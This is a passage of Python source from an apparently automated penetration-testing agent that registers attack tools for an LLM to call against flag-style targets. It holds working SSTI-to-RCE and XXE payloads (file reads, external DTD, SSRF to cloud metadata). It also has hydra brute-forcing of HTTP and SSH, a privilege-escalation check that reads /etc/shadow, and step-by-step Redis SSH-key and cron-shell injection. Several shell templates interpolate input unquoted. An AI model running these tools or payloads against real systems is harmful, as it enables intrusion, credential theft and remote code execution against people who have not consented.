                        results.append({"phase": "exploit", "payload": rce_payload, "flag": flag_match.group(0)})
                        break
                    elif body.strip():
                        results.append({"phase": "exploit", "payload": rce_payload, "response_len": len(body), "response_preview": body[:300]})
                except Exception as e:
                    results.append({"phase": "exploit", "payload": rce_payload, "error": str(e)})

        elapsed = (time.perf_counter() - start) * 1000
        found_flags = [r for r in results if r.get("flag")]
        return ToolResult(
            tool_name="ssti_inject", success=bool(found_flags),
            stdout=_json.dumps(results, indent=2),
            stderr="" if found_flags else "No SSTI detected or exploitation unsuccessful",
            exit_code=0 if found_flags else 1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="ssti_inject",
        func=ssti_inject,
        description="Test for Server-Side Template Injection (SSTI). Sends math evaluation payloads ({{7*7}}, ${7*7}, <%= 7*7 %>) to detect Jinja2/Twig/FreeMarker/ERB template injection. If SSTI is confirmed, attempts RCE via OS command execution to read flag files. Supports GET and POST methods.",
        parameters={
            "target_url": {"type": "string", "description": "Target URL or endpoint (e.g. 'http://target:10112/submit')"},
            "param_name": {"type": "string", "description": "Parameter name that is injected into the template (default 'name')"},
            "method": {"type": "string", "description": "HTTP method: GET (query string) or POST (form body). Default GET."},
            "template_engine": {"type": "string", "description": "Template engine to target: jinja2, twig, freemarker, erb, or 'all' to auto-detect. Default jinja2."},
        },
    )

    # ── XXE Injection & File Read ────────────────────────────────
    async def xxe_inject(
        target_url: str, read_file: str = "/flag.txt",
        custom_xml: str = "", use_dtd: bool = False,
    ) -> ToolResult:
        """Send XXE (XML External Entity) payloads to read files or perform SSRF.

        Constructs XXE payloads with external entity definitions and sends them
        as application/xml. Extracts flag from response if found.
        """
        import asyncio, time, urllib.request, json as _json, ssl
        start = time.perf_counter()

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        # Build XXE payloads
        payloads = []
        if custom_xml:
            payloads.append(custom_xml)

        # Standard inline DTD file read (works without external DTD)
        files_to_try = [read_file] if read_file else ["/flag.txt", "/FLAG.txt", "/etc/passwd", "C:\\flag.txt", "/flag"]
        for f in files_to_try[:3]:
            payloads.append(f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{f}">
]>
<root><data>&xxe;</data></root>''')

        # Blind XXE with parameter entity (file read via external DTD)
        if use_dtd:
            payloads.append(f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{files_to_try[0] if files_to_try else '/flag.txt'}">
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9999/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>''')

        # SSRF via XXE
        payloads.append('''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>''')

        results: list[dict] = []
        for xml_body in payloads[:5]:
            try:
                data = xml_body.encode("utf-8")
                req = urllib.request.Request(
                    target_url, data=data,
                    headers={"Content-Type": "application/xml"},
                )
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                body = resp.read().decode("utf-8", errors="replace")

                import re
                flag_match = re.search(r'flag\{[^}]+\}', body)
                results.append({
                    "payload_preview": xml_body[:200],
                    "response_len": len(body),
                    "response_preview": body[:500],
                    "flag": flag_match.group(0) if flag_match else None,
                })
                if flag_match:
                    break
            except urllib.error.HTTPError as e:
                err_body = e.read().decode("utf-8", errors="replace")
                results.append({"error": f"HTTP {e.code}", "response": err_body[:300]})
            except Exception as e:
                results.append({"error": str(e)})

        elapsed = (time.perf_counter() - start) * 1000
        found_flags = [r for r in results if r.get("flag")]
        return ToolResult(
            tool_name="xxe_inject", success=bool(found_flags),
            stdout=_json.dumps(results, indent=2),
            stderr="" if found_flags else "No XXE exploitation successful",
            exit_code=0 if found_flags else 1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="xxe_inject",
        func=xxe_inject,
        description="Send XXE (XML External Entity) payloads to read files or perform SSRF. Constructs external entity definitions targeting file:// paths. Supports inline DTD file read and external DTD mode for blind XXE. Also probes SSRF via XXE to cloud metadata endpoint (169.254.169.254). Sends requests with Content-Type: application/xml.",
        parameters={
            "target_url": {"type": "string", "description": "Target URL that accepts XML input (e.g. 'http://target:10113/import')"},
            "read_file": {"type": "string", "description": "File path to read via XXE (default '/flag.txt'). Try '/flag.txt', '/FLAG.txt', '/etc/passwd', 'C:\\\\flag.txt'."},
            "custom_xml": {"type": "string", "description": "Custom XML body with XXE payload (optional — if empty, auto-generates standard payloads)"},
            "use_dtd": {"type": "boolean", "description": "Enable blind XXE with parameter entity + external DTD (requires out-of-band server)"},
        },
    )

    # ── Hydra: Brute force ───────────────────────────────────────
    async def hydra_http_brute(
        url: str, userlist: str = "/usr/share/dirb/wordlists/common.txt",
        passlist: str = "/usr/share/dirb/wordlists/common.txt",
    ) -> ToolResult:
        """Brute force HTTP POST login form."""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        cmd = (
            f"hydra -l admin -P {passlist} "
            f"{parsed.hostname} "
            f"http-post-form '{parsed.path or '/'}:"
            f"user=^USER^&pass=^PASS^:"
            f"F=incorrect|F=invalid|F=failed' "
            f"-t 4 -f 2>&1 | head -50"
        )
        return await _run_shell(cmd, timeout=120)

    gateway.register(
        name="hydra_http_brute",
        func=hydra_http_brute,
        description="Brute force HTTP login form with common password using hydra",
        parameters={
            "url": {"type": "string", "description": "Target login URL"},
            "userlist": {"type": "string", "description": "Path to username wordlist"},
            "passlist": {"type": "string", "description": "Path to password wordlist"},
        },
    )

    gateway.register_shell_tool(
        name="hydra_ssh_brute",
        command_template="hydra -l root -P /usr/share/dirb/wordlists/common.txt ssh://{target} -t 4 -f 2>&1 | head -50",
        description="Brute force SSH login with common passwords using hydra",
        parameters={
            "target": {"type": "string", "description": "Target hostname or IP"},
        },
        parser=_parse_hydra_output,
        timeout=120,
    )

    gateway.register_shell_tool(
        name="ssh_exec",
        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {username}@{host} '{command}' 2>&1",
        description="Execute a command on a remote host via SSH (requires username + password). Use for Linux privilege escalation checks (sudo -l, uname -a, id), file listing, flag hunting, and post-exploitation.",
        parameters={
            "host": {"type": "string", "description": "SSH target hostname or IP"},
            "port": {"type": "integer", "description": "SSH port", "default": 22},
            "username": {"type": "string", "description": "SSH username", "default": "root"},
            "password": {"type": "string", "description": "SSH password", "default": ""},
            "command": {"type": "string", "description": "Command to execute on the remote host", "default": "id"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="shell_exec",
        command_template="{command} 2>&1",
        description="Execute a shell command on the LOCAL DARWIN host (NOT the target). Use ONLY for local operations: SSH keygen, compiling exploits, running local scripts, reading local files. For REMOTE service interaction (etcd, databases, K8s, SSH), use that service's dedicated tool — do NOT substitute shell_exec to run etcdctl/kubectl/ssh locally.",
        parameters={
            "command": {"type": "string", "description": "Full shell command to execute locally"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    gateway.register_shell_tool(
        name="ssh_key_exec",
        command_template="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o PasswordAuthentication=no -o BatchMode=yes -p {port} -i {key_path} {user}@{host} '{command}' 2>&1",
        description="Execute a command on a remote host using SSH key authentication (no password needed). Always specify port — default SSH port is 22, but many targets use non-standard ports.",
        parameters={
            "key_path": {"type": "string", "description": "Path to SSH private key file", "default": "~/.ssh/id_rsa"},
            "user": {"type": "string", "description": "SSH username", "default": "root"},
            "host": {"type": "string", "description": "Target host IP or hostname"},
            "port": {"type": "integer", "description": "SSH port (e.g. 10222)", "default": 22},
            "command": {"type": "string", "description": "Command to execute on the remote host"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="test_credential",
        command_template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {user}@{host} '{command}' 2>&1",
        description="Test SSH credentials ONLY (uses sshpass). Does NOT work for MSSQL, MySQL, HTTP, or other protocols. For database credential testing use mssqlclient_query, mysql_query, psql_query, or oracle_query instead.",
        parameters={
            "user": {"type": "string", "description": "Username to test", "default": "root"},
            "password": {"type": "string", "description": "Password to test", "default": ""},
            "host": {"type": "string", "description": "Target host IP or hostname"},
            "port": {"type": "integer", "description": "SSH port (e.g. 10222)", "default": 22},
            "command": {"type": "string", "description": "Command to execute if login succeeds (default: id)", "default": "id"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Database Credential Testing ─────────────────────────────────
    async def test_db_credential(
        host: str, port: int, service_type: str,
        username: str = "", password: str = "",
    ) -> ToolResult:
        """Test credentials against a database service by attempting a basic query.

        Routes to the correct DB client tool based on service_type and attempts
        a simple query (SELECT 1, PING, etc.) to verify the credentials work.
        Returns success=True if the connection and query succeed.
        """
        import asyncio, time, json as _json

        start = time.perf_counter()
        service_type = service_type.lower().strip()

        # Map service type to (tool_name, test_query, tool_params)
        _DB_TEST_MAP: dict[str, tuple[str, dict]] = {
            "mysql":      ("mysql_query",      {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
            "mariadb":    ("mysql_query",      {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
            "postgresql": ("psql_query",       {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
            "postgres":   ("psql_query",       {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
            "mssql":      ("mssqlclient_query",{"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
            "oracle":     ("oracle_query",     {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1 FROM DUAL"}),
            "redis":      ("redis_cmd",        {"host": host, "port": port, "command": "PING"}),
            "mongodb":    ("shell_exec",       {"command": f"echo 'db.runCommand({{ping:1}})' | mongosh mongodb://{username}:{password}@{host}:{port} --quiet 2>&1"}),
            "elasticsearch": ("elasticsearch_query", {"host": host, "port": port, "query": "_cluster/health"}),
            "couchdb":    ("couchdb_query",    {"host": host, "port": port, "query": "_all_dbs"}),
        }

        if service_type not in _DB_TEST_MAP:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="test_db_credential", success=False,
                stdout="", stderr=f"Unsupported service type: {service_type}. Supported: {', '.join(sorted(_DB_TEST_MAP))}",
                exit_code=1, elapsed_ms=elapsed,
            )

        tool_name, params = _DB_TEST_MAP[service_type]
        try:
            # Find the tool function from the gateway
            if tool_name in gateway.get_tool_names():
                result = await gateway.call(tool_name, params)
                elapsed = (time.perf_counter() - start) * 1000
                stdout = getattr(result, 'stdout', '') or ''
                stderr = getattr(result, 'stderr', '') or ''
                success = getattr(result, 'success', False)

                # Check for successful query indicators
                _ok_patterns = ["ok", "1 row", "pong", "green", "cluster_name"]
                if success and stdout.strip():
                    summary = f"[{service_type.upper()}] Credential test: SUCCESS\n{stdout[:500]}"
                    return ToolResult(
                        tool_name="test_db_credential", success=True,
                        stdout=summary, stderr=stderr,
                        exit_code=0, elapsed_ms=elapsed,
                    )
                else:
                    return ToolResult(
                        tool_name="test_db_credential", success=False,
                        stdout=stdout[:300], stderr=stderr or "Connection/query failed",
                        exit_code=getattr(result, 'exit_code', 1),
                        elapsed_ms=elapsed,
                    )
            else:
                elapsed = (time.perf_counter() - start) * 1000
                return ToolResult(
                    tool_name="test_db_credential", success=False,
                    stdout="", stderr=f"Tool '{tool_name}' not available for {service_type}",
                    exit_code=1, elapsed_ms=elapsed,
                )
        except Exception as e:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="test_db_credential", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=elapsed,
            )

    gateway.register(
        name="test_db_credential",
        func=test_db_credential,
        description="Test credentials against a database service (MySQL, PostgreSQL, MSSQL, Oracle, Redis, MongoDB, Elasticsearch, CouchDB). Attempts a basic query to verify access. Use after discovering DB services via nmap. Credentials that succeed are confirmed valid.",
        parameters={
            "host": {"type": "string", "description": "Database host IP or hostname"},
            "port": {"type": "integer", "description": "Database port number"},
            "service_type": {"type": "string", "description": "Service type: mysql, postgresql, mssql, oracle, redis, mongodb, elasticsearch, couchdb"},
            "username": {"type": "string", "description": "Username (leave empty for Redis which is password-only)"},
            "password": {"type": "string", "description": "Password (leave empty for no-auth attempt)"},
        },
    )

    # ── Linux Privilege Escalation Tools ──────────────────────────

    gateway.register_shell_tool(
        name="linux_priv_check",
        command_template="echo '=== USER ===' && id && echo '=== KERNEL ===' && uname -a && echo '=== SUDO ===' && sudo -ln 2>/dev/null || echo '(no sudo)' && echo '=== SUID ===' && find / -perm -4000 -type f 2>/dev/null | head -20 && echo '=== CAPS ===' && capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap || echo '(no capsh)' && echo '=== CRON ===' && ls -la /etc/cron* 2>/dev/null || echo '(no cron)' && echo '=== PASSWD ===' && cat /etc/passwd 2>/dev/null | head -20 && echo '=== SHADOW ===' && cat /etc/shadow 2>/dev/null | head -5 || echo '(no shadow read)'",
        description="Comprehensive LOCAL Linux privilege escalation check. Runs: id, uname -a, sudo -l, SUID binary search, capabilities, cron jobs, user/password enumeration. For REMOTE targets, use ssh_exec with individual commands instead.",
        parameters={},
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── SearchSploit: Exploit-DB search ───────────────────────────
    gateway.register_shell_tool(
        name="searchsploit_search",
        command_template="searchsploit {query} 2>&1 | head -30",
        description="Search Exploit-DB for public exploits matching query (CVE, software name, etc.)",
        parameters={
            "query": {"type": "string", "description": "Search term: CVE ID, software name, or vulnerability type"},
        },
        parser=_parse_searchsploit_output,
        timeout=30,
    )

    # ── SMBMap: SMB enumeration ──────────────────────────────────
    gateway.register_shell_tool(
        name="smbmap_enum",
        command_template="smbmap -H {target} 2>&1",
        description="Enumerate SMB shares and their permissions on a target host",
        parameters={
            "target": {"type": "string", "description": "Target IP or hostname"},
        },
        parser=_parse_smbmap_output,
        timeout=60,
    )

    # ── SMB Client: file read/write on SMB shares ──────────────────
    gateway.register_shell_tool(
        name="smb_client",
        command_template="smbclient -U {domain}/{user}%{password} //{host}/{share} -c \"{command}\" 2>&1",
        description="Access SMB/CIFS shares for file read/write operations. Use for reading SYSVOL (GPP/cpassword), accessing shared folders, and downloading files from Windows/AD hosts. For share enumeration use smbmap_enum first. Command examples: 'ls', 'get Groups.xml /tmp/out.xml', 'put local_file remote_path'.",
        parameters={
            "domain": {"type": "string", "description": "Domain name (use 'WORKGROUP' for non-domain hosts)"},
            "user": {"type": "string", "description": "Username"},
            "password": {"type": "string", "description": "Password"},
            "host": {"type": "string", "description": "SMB server IP or hostname"},
            "share": {"type": "string", "description": "Share name (e.g. SYSVOL, C$, IPC$)"},
            "command": {"type": "string", "description": "smbclient command: 'ls', 'get <remote_file> <local_path>', 'put <local_file> <remote_path>', 'cd <dir>', 'prompt OFF; mget *'"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Knowledge search (DarwinRAG + keyword fallback) ──────────
    async def knowledge_search(query: str, category: str = "") -> ToolResult:
        """Search penetration testing knowledge base for exploit patterns.

        Category filter is IGNORED for the primary search — it causes false
        negatives when knowledge entries use different category tags than the
        LLM expects. The LLM-provided category is only used if the initial
        unfiltered search returns >10 results, as a precision refinement pass.
        """
        try:
            from darwin.rag import get_rag
            rag = get_rag()
            # Always search WITHOUT category filter first
            results = rag.search(query, top_k=5, category="", min_keyword_overlap=0.2)
            # Only apply category filter if first pass is too noisy
            if len(results) > 10 and category:
                results = rag.search(query, top_k=5, category=category, min_keyword_overlap=0.2)

            if not results:
                try:
                    from darwin.knowledge_base import KnowledgeBase
                    kb = KnowledgeBase()
                    kb_entries = kb.search(query, category="", top_k=5)
                    if kb_entries:
                        output = "## Knowledge Base (keyword match)\n\n"
                        for i, e in enumerate(kb_entries, 1):
                            output += f"### {i}. {e.title} ({e.category}/{e.subcategory})"
                            if e.mitre_attack:
                                output += f" MITRE:{e.mitre_attack}"
                            output += f"\n{e.description}\n"
                            if e.techniques:
                                output += "**Techniques:**\n"
                                for t in e.techniques[:5]:
                                    output += f"  - {t}\n"
                            output += "\n"
                        return ToolResult(tool_name="knowledge_search", success=True,
                            stdout=output, stderr="", exit_code=0, elapsed_ms=0)
                except ImportError:
                    pass
                return ToolResult(tool_name="knowledge_search", success=True,
                    stdout="No matching knowledge patterns found.", stderr="", exit_code=0, elapsed_ms=0)

            output = "## Knowledge Base\n\n"
            for i, r in enumerate(results, 1):
                output += f"### {i}. {r['title']} (score:{r['score']:.3f}, {r.get('collection','')}/{r['category']})\n"
                output += f"{r['description']}\n"
                if r.get('techniques'):
                    output += "**Techniques:**\n"
                    for t in r.get('techniques', [])[:5]:
                        output += f"  - {t}\n"
                output += "\n"
            return ToolResult(tool_name="knowledge_search", success=True,
                stdout=output, stderr="", exit_code=0, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="knowledge_search", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="knowledge_search",
        func=knowledge_search,
        description="Research tool — search the knowledge base for known vulnerabilities, exploitation techniques, and configuration weaknesses for a specific technology, service version, or vulnerability type. Call this BEFORE running exploit tools to identify the correct approach. Example queries: 'SQL injection MariaDB', 'JWT token bypass', 'Flask SSTI exploitation'",
        parameters={
            "query": {"type": "string", "description": "Natural language query (e.g. 'IDOR in FastAPI')"},
            "category": {"type": "string", "description": "Optional filter: IDOR, SQLI, AUTH, RECON"},
        },
    )

    # ── DuckDuckGo Web Search (Python ddgs, replaces broken MCP) ────
    async def ddg_web_search(query: str, max_results: int = 8) -> ToolResult:
        """Search the internet via DuckDuckGo for up-to-date exploitation
        techniques, default credentials, version-specific PoCs, and recent CVEs.
        Use TOGETHER with knowledge_search — RAG covers general techniques,
        web search provides current service-specific details.

        This replaces the unreliable Node MCP ddg-search server (all 3 backends
        — web-search, iask-search, monica-search — were timing out).
        """
        try:
            from ddgs import DDGS
            # Only use engines that work in restricted network environments.
            # yandex + mojeek are the only ones accessible from mainland China.
            # DuckDuckGo/Google/Brave/Yahoo/Startpage all timeout (GFW).
            results = list(DDGS(timeout=8).text(
                query,
                max_results=max(1, min(max_results, 15)),
                backend="yandex,mojeek",
            ))
            if not results:
                return ToolResult(tool_name="ddg_web_search", success=True,
                    stdout="No results found.", stderr="", exit_code=0, elapsed_ms=0)
            lines = []
            for i, r in enumerate(results):
                lines.append(f"{i+1}. **{r.get('title', '')}**")
                lines.append(f"   URL: {r.get('href', '')}")
                body = r.get('body', '') or ''
                if body:
                    lines.append(f"   {body[:300]}")
                lines.append("")
            return ToolResult(tool_name="ddg_web_search", success=True,
                stdout="\n".join(lines), stderr="", exit_code=0, elapsed_ms=0)
        except ImportError:
            return ToolResult(tool_name="ddg_web_search", success=False,
                stdout="ddgs library not installed. Run: pip install ddgs",
                stderr="", exit_code=1, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="ddg_web_search", success=False,
                stdout=f"Search failed: {e}", stderr="", exit_code=1, elapsed_ms=0)

    gateway.register(
        name="ddg_web_search",
        func=ddg_web_search,
        description="Search the internet via DuckDuckGo for current exploitation techniques, default credentials, version-specific PoCs, and recent CVEs. Use together with knowledge_search. Parameters: query (search terms), max_results (1-15, default 8).",
        parameters={
            "query": {"type": "string", "description": "Search query (e.g. 'MSSQL sa default password exploitation')"},
            "max_results": {"type": "integer", "description": "Max results (1-15, default 8)"},
        },
    )

    # ── CVE Lookup: NIST NVD API ──────────────────────────────────
    async def cve_lookup(cve_id: str) -> ToolResult:
        """Look up CVE details from the NIST NVD API (free, no key required)."""
        import urllib.request as _ur, json as _json
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            req = _ur.Request(url, headers={"User-Agent": "DARWIN/0.1"})
            with _ur.urlopen(req, timeout=15) as resp:
                data = _json.loads(resp.read())
            vulns = data.get("vulnerabilities", [])
            if not vulns:
                return ToolResult(tool_name="cve_lookup", success=True,
                    stdout=f"No CVE data found for {cve_id}", stderr="", exit_code=0, elapsed_ms=0)
            cve = vulns[0].get("cve", {})
            desc = cve.get("descriptions", [{}])[0].get("value", "")[:500]
            metrics = cve.get("metrics", {})
            cvss_v31 = metrics.get("cvssMetricV31", [{}])[0].get("cvssData", {})
            cvss_score = cvss_v31.get("baseScore", "N/A")
            cvss_severity = cvss_v31.get("baseSeverity", "N/A")
            vector = cvss_v31.get("vectorString", "")
            published = cve.get("published", "")
            modified = cve.get("lastModified", "")
            refs = [r.get("url", "") for r in cve.get("references", [])[:5]]
            output = (
                f"CVE: {cve_id}\n"
                f"CVSS v3.1: {cvss_score} ({cvss_severity})\n"
                f"Vector: {vector}\n"
                f"Published: {published}\n"
                f"Modified: {modified}\n"
                f"Description: {desc}\n"
                f"References:\n" + "\n".join(f"  - {r}" for r in refs)
            )
            return ToolResult(tool_name="cve_lookup", success=True, stdout=output,
                stderr="", exit_code=0, elapsed_ms=0,
                parsed_output={"cve_id": cve_id, "cvss_score": cvss_score,
                    "severity": cvss_severity, "description": desc[:200], "references": refs})
        except Exception as e:
            return ToolResult(tool_name="cve_lookup", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="cve_lookup",
        func=cve_lookup,
        description="Look up CVE details from NIST NVD: CVSS score, severity, description, affected versions, and references. Use to assess vulnerability severity and find patches.",
        parameters={
            "cve_id": {"type": "string", "description": "CVE ID (e.g. CVE-2021-44228, CVE-2023-12345)"},
        },
    )

    # ── Metasploit exploit search ──────────────────────────────────
    async def metasploit_search(query: str) -> ToolResult:
        """Search Metasploit Framework for available exploit modules."""
        import asyncio
        try:
            cmd = f"msfconsole -q -x 'search {query}; exit' 2>&1"
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode("utf-8", errors="replace")
            err_output = stderr.decode("utf-8", errors="replace")
            # Check if msfconsole is not installed (shell returns "not found")
            if "not found" in output.lower() or "not found" in err_output.lower():
                return ToolResult(tool_name="metasploit_search", success=False,
                    stdout="msfconsole not installed. Install: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo bash msfinstall",
                    stderr="msfconsole not found on PATH", exit_code=127, elapsed_ms=0)
            if "Matching Modules" in output or "exploit/" in output:
                return ToolResult(tool_name="metasploit_search", success=True,
                    stdout=output[:5000], stderr=err_output,
                    exit_code=proc.returncode or 0, elapsed_ms=0)
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout=output[:2000] or "No matching modules found",
                stderr=err_output, exit_code=proc.returncode or 0, elapsed_ms=0)
        except asyncio.TimeoutError:
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout="msfconsole search timed out", stderr="", exit_code=1, elapsed_ms=0)
        except Exception as e:
            return ToolResult(tool_name="metasploit_search", success=False,
                stdout=f"msfconsole search failed: {e}", stderr=str(e), exit_code=1, elapsed_ms=0)

    gateway.register(
        name="metasploit_search",
        func=metasploit_search,
        description="Search Metasploit Framework for available exploit modules, auxiliary scanners, and post-exploitation modules matching the query. Returns module name, rank, and description. Requires msfconsole installed.",
        parameters={
            "query": {"type": "string", "description": "Search term: software name, CVE ID, or vulnerability type (e.g. 'apache struts', 'CVE-2021-44228', 'samba')"},
        },
    )

    # ── go-exploitdb local search ──────────────────────────────────
    async def go_exploitdb_search(query: str, limit: int = 10) -> ToolResult:
        """Search local exploit databases for exploits matching a CVE or keyword.

        Tries go-exploitdb SQLite database first, falls back to searchsploit.
        """
        import sqlite3
        db_path = Path(__file__).parent.parent.parent / "go-exploitdb.sqlite3"
        if db_path.exists():
            try:
                conn = sqlite3.connect(str(db_path))
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT cve_id, description, url, exploit_type FROM exploits "
                    "WHERE cve_id LIKE ? OR description LIKE ? LIMIT ?",
                    (f"%{query}%", f"%{query}%", limit),
                )
                rows = cursor.fetchall()
                conn.close()
                if rows:
                    results = [f"CVE: {r[0]}\nDescription: {r[1]}\nURL: {r[2]}\nType: {r[3]}" for r in rows]
                    return ToolResult(tool_name="go_exploitdb_search", success=True,
                        stdout="\n---\n".join(results), stderr="",
                        exit_code=0, elapsed_ms=0)
            except Exception:
                pass

        # Fallback to searchsploit
        import asyncio
        cmd = f"searchsploit {query} 2>&1 | head -{limit + 5}"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        stdout_str = stdout.decode("utf-8", errors="replace")
        if proc.returncode == 0 and stdout_str.strip():
            return ToolResult(tool_name="go_exploitdb_search", success=True,
                stdout=stdout_str[:3000], stderr="",
                exit_code=0, elapsed_ms=0)
        return ToolResult(tool_name="go_exploitdb_search", success=False,
            stdout="No exploits found. Try: go-exploitdb fetch --log-dir /tmp (to populate local DB)",
            stderr=stderr.decode("utf-8", errors="replace")[:500],
            exit_code=1, elapsed_ms=0)

    gateway.register(
        name="go_exploitdb_search",
        func=go_exploitdb_search,
        description="Search local go-exploitdb for public exploits matching a CVE ID or keyword. Returns exploit type, description, and references. Requires go-exploitdb database (fetch with: go-exploitdb fetch).",
        parameters={
            "query": {"type": "string", "description": "CVE ID or keyword to search for (e.g. 'CVE-2021-44228', 'Apache')"},
            "limit": {"type": "integer", "description": "Max results (default 10)"},
        },
    )

    # ── Database Client Tools ──────────────────────────────────────

    gateway.register_shell_tool(
        name="mysql_query",
        command_template="mysql -h {host} -P {port} -u {user} -p'{password}' -e '{query}' 2>&1",
        description="Execute a SQL query on a MySQL/MariaDB database. Use for data extraction, UDF privilege escalation checks, and reading files via LOAD_FILE().",
        parameters={
            "host": {"type": "string", "description": "MySQL host IP or hostname"},
            "port": {"type": "integer", "description": "MySQL port (default 3306)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="psql_query",
        command_template="PGPASSWORD='{password}' psql -h {host} -p {port} -U {user} -w -c '{query}' 2>&1",
        description="Execute a SQL query on a PostgreSQL database. Use for data extraction, COPY PROGRAM execution, and reading files.",
        parameters={
            "host": {"type": "string", "description": "PostgreSQL host IP or hostname"},
            "port": {"type": "integer", "description": "PostgreSQL port (default 5432)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="redis_cmd",
        command_template="redis-cli -h {host} -p {port} {command} 2>&1",
        description="Execute a single command on a Redis server. Call once per command. Use for data extraction (KEYS *, GET key). SSH key injection requires a CHAIN of separate calls: redis_cmd(host,port,'CONFIG SET dir /root/.ssh') → redis_cmd(host,port,'CONFIG SET dbfilename authorized_keys') → redis_cmd(host,port,'SET key \"\\n\\nssh-rsa AA...\"') → redis_cmd(host,port,'SAVE'). Cron shell: CONFIG SET dir /var/spool/cron/crontabs → CONFIG SET dbfilename root → SET key 'cmd' → SAVE. Also: CONFIG GET (check config), FLUSHALL (clear data), INFO (server info).",
        parameters={
            "host": {"type": "string", "description": "Redis host IP or hostname"},
            "port": {"type": "integer", "description": "Redis port (default 6379)"},
            "command": {"type": "string", "description": "Redis command to execute (e.g. 'KEYS *', 'GET flag', 'INFO')"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="mssql_query",
        command_template="sqlcmd -S {host},{port} -U {user} -P '{password}' -Q '{query}' 2>&1",
        description="Execute a SQL query on a Microsoft SQL Server using sqlcmd. If sqlcmd is not available, use mssqlclient_query instead (uses impacket, already installed).",
        parameters={
            "host": {"type": "string", "description": "MSSQL host IP or hostname"},
            "port": {"type": "integer", "description": "MSSQL port (default 1433)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    async def _mssqlclient_query(host: str = "localhost", port: int = 1433,
                                 user: str = "sa", password: str = "",
                                 query: str = "SELECT @@version",
                                 **kwargs) -> ToolResult:
        """Execute a SQL query on MSSQL using impacket's mssqlclient.py."""
        # Accept common parameter name variations
        if not host or host == "localhost":
            host = str(kwargs.get("server", kwargs.get("hostname", host)))
        if user == "sa":
            user = str(kwargs.get("username", user))
        import asyncio, time
        start = time.perf_counter()
        # Build target string: empty password → no colon + -no-pass flag
        if password:
            target_str = f"{user}:{password}@{host}"
            cmd = f"mssqlclient.py -port {port} {target_str} -command '{query}' 2>&1"
        else:
            target_str = f"{user}@{host}"
            cmd = f"mssqlclient.py -port {port} -no-pass {target_str} -command '{query}' 2>&1"
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            stdout_s = stdout.decode("utf-8", errors="replace")
            stderr_s = stderr.decode("utf-8", errors="replace")
            elapsed = (time.perf_counter() - start) * 1000
            # impacket's mssqlclient.py returns exit 0 even on auth failure —
            # detect "Login failed" in output to mark as failure so dependent
            # plan tasks don't get incorrectly unblocked.
            combined = (stdout_s + stderr_s).lower()
            auth_failed = "login failed" in combined
            success = proc.returncode == 0 and not auth_failed
